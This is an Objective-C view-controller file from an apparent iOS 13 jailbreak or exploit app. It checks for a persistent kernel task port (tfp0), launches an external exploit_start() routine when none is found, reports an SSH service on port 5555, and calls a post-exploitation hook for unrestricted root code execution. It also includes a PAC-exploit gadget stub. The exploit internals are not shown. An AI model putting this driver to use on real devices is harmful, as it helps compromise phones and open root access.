//
//  ViewController.m
//  ios13_app1
//
//  Created by bb on 1/12/20.
//  Copyright © 2020 bb. All rights reserved.
//

#import "ViewController.h"
#include <mach/mach.h>
#include <sys/time.h>
#include <objc/runtime.h>
#include <pthread/pthread.h>
#include <sys/utsname.h>
#include <dlfcn.h>
#include "xpc.h"
#include <sys/stat.h>
#include <sys/attr.h>
#include <Security/Security.h>
#include <sys/mman.h>
#include <mach-o/fat.h>

extern bool share_analytics;

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UISwitch *uploadCheckbox;
@property (weak, nonatomic) IBOutlet UITextView *logview;
@property (weak, nonatomic) IBOutlet UIButton *upper_bar;
@property (weak, nonatomic) IBOutlet UIButton *lower_bar;
@end

@implementation ViewController

char *string_get_basename(const char *str) {
    char *base = strrchr(str, '/');
    return base ? base+1 : str;
}

void get_string(char *copyto){
    // Gadget for userspace PAC exploit
    
    NSString *nsstr = [[NSString alloc] initWithUTF8String:"AAABBBCCCDDDEEE"];
    memcpy(copyto, (__bridge const void *)(nsstr), 0x30);
}

#define printf(X,X1...) {char logdata[256];snprintf(logdata, sizeof(logdata), X, X1);extern void log_toView(const char *input_cstr);log_toView(logdata);}
#define printf2(X) {extern void log_toView(const char *input_cstr);log_toView(X);}

int ppcccp = 1;
void ppp(){
    printf("%d...\n", ppcccp++);
}

UITextView *log_outview_toC;
void log_toView(const char *input_cstr){
    
    dispatch_sync( dispatch_get_main_queue(), ^{
        log_outview_toC.text = [log_outview_toC.text stringByAppendingString:[NSString stringWithUTF8String:input_cstr]];
        [log_outview_toC scrollRangeToVisible:NSMakeRange(log_outview_toC.text.length, 1)];
    });
}

void run_exploit_or_achieve_tf0() {
    
    extern char *get_current_deviceModel(void);
    printf("Model: %s\n", get_current_deviceModel());
    printf("Version: %s\n", [[[UIDevice currentDevice] systemVersion] UTF8String]);

    
    extern uint64_t kaslr;
    extern mach_port_t tfp0_port;
    
    // Activate tfp0-persis program
    mach_port_t midi_bsport = 0;
    extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
    bootstrap_look_up(bootstrap_port, "com.apple.midiserver", &midi_bsport);
    if(!midi_bsport){
        //printf("run_exploit_or_achieve_tf0 failed: bootstrap_look_up has problem\n");
        exit(1);
    }
    
    mach_port_t stored_ports[3] = {0};
    stored_ports[0] = mach_task_self();
    stored_ports[2] = midi_bsport;
    mach_ports_register(mach_task_self(), stored_ports, 3);
    // Waiting for installation
    sleep(2);
    
    tfp0_port = 0;
    task_get_special_port(mach_task_self(), TASK_ACCESS_PORT, &tfp0_port);
    if(tfp0_port == 0){
        printf2("require to run exploit first\n");
        
        extern bool check_device_compatibility(void);
        if(check_device_compatibility() == false){
            printf("Execution pause: Not found offsets set for current device(model: %s)\n", get_current_deviceModel());
            return;
        }
        
        extern void exploit_start(void);
        exploit_start();
        
        printf2("persis tfp0 installed, you can quit app now...\n");
        return;
        //sleep(1);
        //kill(getpid(), SIGKILL);
    }
    stored_ports[2] = 0;
    mach_ports_register(mach_task_self(), stored_ports, 3);
    
    printf("tfp0: 0x%x\n", tfp0_port);
    pid_for_task(tfp0_port, (int*)&kaslr);
    printf("kaslr: 0x%x\n", (uint32_t)kaslr);
    
    printf2("SSH service already running (port: 5555)\n");
    printf2("this device ip:\n");
    extern void display_ip_address(void); display_ip_address();


    extern void run_post_exp_from_tfp0(void); run_post_exp_from_tfp0();// for debug-purpose, run any code with unrestrcited root priv
    
}

void check_first_whatsoever() {
    printf2("Detecting tfp0 status...\n");
    run_exploit_or_achieve_tf0();
}

char *itunes_export_path = NULL;
char *Build_itunes_path(char *filename){
    if(!filename)
        return strdup([[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)[0]stringByAppendingString:@"/"] UTF8String]);
    char *path = strdup([[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)[0]stringByAppendingPathComponent:[NSString stringWithUTF8String:filename]] UTF8String]);
    //unlink(path);
    return path;
}

char *Build_resource_path(char *filename){
    if(!filename)
        return strdup([[[[NSBundle mainBundle] resourcePath] stringByAppendingString:@"/"] UTF8String]);
    char *path = strdup([[[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:[NSString stringWithUTF8String:filename]] UTF8String]);
    return path;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    
    // Background UI config
    log_outview_toC = self.logview;
    self.logview.backgroundColor = [UIColor whiteColor];
    
    self.view.backgroundColor = [UIColor whiteColor];
    self.upper_bar.backgroundColor = [UIColor blackColor];
    self.lower_bar.backgroundColor = [UIColor blackColor];
}

- (IBAction)onStartPressed:(UIButton *)sender {
    _uploadCheckbox.enabled = NO;
    sender.enabled = NO;
    share_analytics = _uploadCheckbox.isOn;
     dispatch_async(dispatch_get_main_queue(), ^{
         dispatch_async(dispatch_queue_create("exploit_main_loop", 0), ^{
            check_first_whatsoever();
         });
     });
 }



@end
